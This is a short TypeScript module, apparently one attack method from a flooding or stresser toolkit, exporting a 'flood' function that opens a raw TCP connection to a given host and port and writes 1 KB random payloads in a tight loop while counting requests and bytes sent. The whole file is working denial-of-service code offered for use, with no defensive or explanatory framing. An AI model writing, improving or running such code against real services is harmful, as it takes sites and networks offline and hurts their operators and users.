import * as net from "net"
import { randomBytes } from "crypto"

function parseUrl(url: string): { host: string; port: number } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 80,
  }
}

export async function flood(
  url: string,
  _rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port } = parseUrl(url)
  const payload = randomBytes(1024)

  const run = () => {
    return new Promise<void>((resolve) => {
      const sock = net.createConnection({ host, port }, () => {
        const send = () => {
          try {
            if (sock.write(payload)) {
              onStats(1, 1024)
              setImmediate(send)
            }
          } catch {
            resolve()
          }
        }
        send()
      })
      sock.on("error", () => resolve())
      sock.on("close", () => resolve())
      sock.setTimeout(5000, () => {
        sock.destroy()
        resolve()
      })
    })
  }

  await run()
}
